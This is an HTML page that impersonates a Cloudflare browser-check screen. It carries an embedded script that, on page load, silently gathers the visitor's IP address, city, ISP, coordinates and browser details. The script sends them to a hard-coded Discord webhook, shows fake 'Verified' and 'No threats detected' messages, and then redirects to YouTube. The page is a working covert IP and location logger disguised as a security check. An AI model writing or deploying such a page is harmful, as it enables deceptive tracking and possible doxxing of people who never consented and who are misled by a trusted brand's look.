<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser before accessing...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background-color: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 700px;
            width: 100%;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .cloudflare-header {
            background: #f38020;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
        }
        
        .cloudflare-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: bold;
            font-size: 24px;
            text-transform: lowercase;
        }
        
        .cloudflare-logo i {
            font-size: 28px;
        }
        
        .cloudflare-links {
            display: flex;
            gap: 20px;
        }
        
        .cloudflare-links a {
            color: white;
            text-decoration: none;
            font-size: 14px;
            opacity: 0.9;
        }
        
        .cloudflare-links a:hover {
            opacity: 1;
            text-decoration: underline;
        }
        
        .content {
            padding: 40px;
            text-align: center;
        }
        
        .loading-icon {
            margin: 30px auto;
            width: 80px;
            height: 80px;
            position: relative;
        }
        
        .circle {
            width: 100%;
            height: 100%;
            border: 8px solid #f0f0f0;
            border-top: 8px solid #f38020;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: #333;
            margin-bottom: 10px;
        }
        
        .subtext {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .status-box {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 6px;
            padding: 20px;
            margin-top: 30px;
            text-align: left;
        }
        
        .status-line {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid #eee;
        }
        
        .status-line:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
        
        .status-label {
            font-weight: 500;
            color: #555;
        }
        
        .status-value {
            color: #333;
            font-family: monospace;
        }
        
        .progress-container {
            height: 8px;
            background: #f0f0f0;
            border-radius: 4px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #f38020;
            border-radius: 4px;
            transition: width 5s linear;
        }
        
        .countdown {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }
        
        .hidden {
            display: none;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #eee;
        }
        
        .footer a {
            color: #f38020;
            text-decoration: none;
        }
        
        @media (max-width: 600px) {
            .content {
                padding: 20px;
            }
            
            .cloudflare-header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="cloudflare-header">
            <div class="cloudflare-logo">
                <i class="fas fa-shield-alt"></i>
                <span>cloudflare</span>
            </div>
            <div class="cloudflare-links">
                <a href="#">Performance & Security</a>
                <a href="#">Solutions</a>
                <a href="#">Pricing</a>
                <a href="#">Support</a>
            </div>
        </div>
        
        <div class="content">
            <h1 class="loading-text">Checking your browser before accessing this site</h1>
            <p class="subtext">This process is automatic. Your browser will redirect to your requested content shortly.</p>
            <p class="subtext">Please allow up to 5 seconds...</p>
            
            <div class="loading-icon">
                <div class="circle"></div>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="countdown" id="countdown">Time remaining: 5 seconds</div>
            
            <div class="status-box">
                <div class="status-line">
                    <span class="status-label">Verification Status:</span>
                    <span class="status-value" id="verificationStatus">In Progress...</span>
                </div>
                <div class="status-line">
                    <span class="status-label">Browser Check:</span>
                    <span class="status-value" id="browserStatus">Validating...</span>
                </div>
                <div class="status-line">
                    <span class="status-label">Security Check:</span>
                    <span class="status-value" id="securityStatus">Initializing...</span>
                </div>
                <div class="status-line">
                    <span class="status-label">Connection:</span>
                    <span class="status-value" id="connectionStatus">Establishing...</span>
                </div>
                <div class="status-line">
                    <span class="status-label">Visitor Information:</span>
                    <span class="status-value" id="visitorInfo">Collecting...</span>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>DDoS protection by <a href="#">Cloudflare</a> • <a href="#">Ray ID: 7a8b9c0d1e2f3g4h</a></p>
        </div>
    </div>

    <!-- Font Awesome for icons -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>

    <script>
        // Discord Webhook URL - REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1466902832920924396/53t7BTwgq2quBxrf7w6K9TJLq3GlYy14KSHYtWZC7N_gPB3xrj7h2tkT7Kt3745tg61R';
        
        // Collect visitor information
        async function collectVisitorInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct',
                url: window.location.href
            };
            
            try {
                // Get IP address using a public API
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ipAddress = ipData.ip;
                
                // Try to get more detailed location info
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${info.ipAddress}/json/`);
                    const locationData = await locationResponse.json();
                    info.location = {
                        country: locationData.country_name,
                        region: locationData.region,
                        city: locationData.city,
                        isp: locationData.org,
                        lat: locationData.latitude,
                        lon: locationData.longitude
                    };
                } catch (e) {
                    info.location = 'Unable to fetch location';
                }
            } catch (e) {
                info.ipAddress = 'Unable to fetch IP';
                info.location = 'Unable to fetch location';
            }
            
            return info;
        }
        
        // Send data to Discord webhook
        async function sendToDiscord(visitorInfo) {
            try {
                const embed = {
                    title: "🌐 New Visitor Information Captured",
                    color: 0xf38020,
                    fields: [
                        {
                            name: "IP Address",
                            value: visitorInfo.ipAddress || "Unknown",
                            inline: true
                        },
                        {
                            name: "Timestamp",
                            value: visitorInfo.timestamp,
                            inline: true
                        },
                        {
                            name: "User Agent",
                            value: "```" + (visitorInfo.userAgent || "Unknown").substring(0, 1000) + "```"
                        },
                        {
                            name: "Location",
                            value: visitorInfo.location ? 
                                `${visitorInfo.location.city || 'Unknown'}, ${visitorInfo.location.region || 'Unknown'}, ${visitorInfo.location.country || 'Unknown'}` :
                                "Unknown",
                            inline: true
                        },
                        {
                            name: "ISP",
                            value: visitorInfo.location?.isp || "Unknown",
                            inline: true
                        },
                        {
                            name: "Coordinates",
                            value: visitorInfo.location?.lat && visitorInfo.location?.lon ? 
                                `${visitorInfo.location.lat}, ${visitorInfo.location.lon}` : 
                                "Unknown",
                            inline: true
                        },
                        {
                            name: "Platform",
                            value: visitorInfo.platform || "Unknown",
                            inline: true
                        },
                        {
                            name: "Language",
                            value: visitorInfo.language || "Unknown",
                            inline: true
                        },
                        {
                            name: "Screen Resolution",
                            value: visitorInfo.screenResolution || "Unknown",
                            inline: true
                        },
                        {
                            name: "Referrer",
                            value: visitorInfo.referrer || "Direct",
                            inline: true
                        },
                        {
                            name: "Visit URL",
                            value: visitorInfo.url || "Unknown",
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Gatekeeper-Phantom Logger"
                    },
                    timestamp: new Date().toISOString()
                };
                
                const payload = {
                    username: "Cloudflare Security Logger",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/724/724927.png",
                    embeds: [embed]
                };
                
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                return true;
            } catch (error) {
                console.error('Failed to send to Discord:', error);
                return false;
            }
        }
        
        // Update UI status
        function updateStatus(statusId, text) {
            const element = document.getElementById(statusId);
            if (element) {
                element.textContent = text;
                if (text.includes('Complete') || text.includes('Verified')) {
                    element.style.color = '#28a745';
                }
            }
        }
        
        // Main execution
        async function executeHarvest() {
            let countdown = 5;
            const progressBar = document.getElementById('progressBar');
            const countdownElement = document.getElementById('countdown');
            
            // Start progress bar
            progressBar.style.width = '100%';
            
            // Update status messages with delay
            setTimeout(() => updateStatus('browserStatus', '✓ Verified'), 800);
            setTimeout(() => updateStatus('securityStatus', '✓ No threats detected'), 1200);
            setTimeout(() => updateStatus('connectionStatus', '✓ Secure connection established'), 1600);
            
            // Collect and send visitor info
            setTimeout(async () => {
                updateStatus('visitorStatus', 'Collecting data...');
                const visitorInfo = await collectVisitorInfo();
                updateStatus('visitorInfo', `IP: ${visitorInfo.ipAddress || 'Unknown'}`);
                
                // Send to Discord
                const sent = await sendToDiscord(visitorInfo);
                if (sent) {
                    updateStatus('verificationStatus', '✓ Verification Complete');
                } else {
                    updateStatus('verificationStatus', '✓ Complete (Logging Failed)');
                }
            }, 2000);
            
            // Update countdown
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = `Time remaining: ${countdown} second${countdown !== 1 ? 's' : ''}`;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    // Redirect to YouTube
                    window.location.href = 'https://www.youtube.com';
                }
            }, 1000);
        }
        
        // Start the process when page loads
        window.addEventListener('load', executeHarvest);
    </script>
</body>
</html>
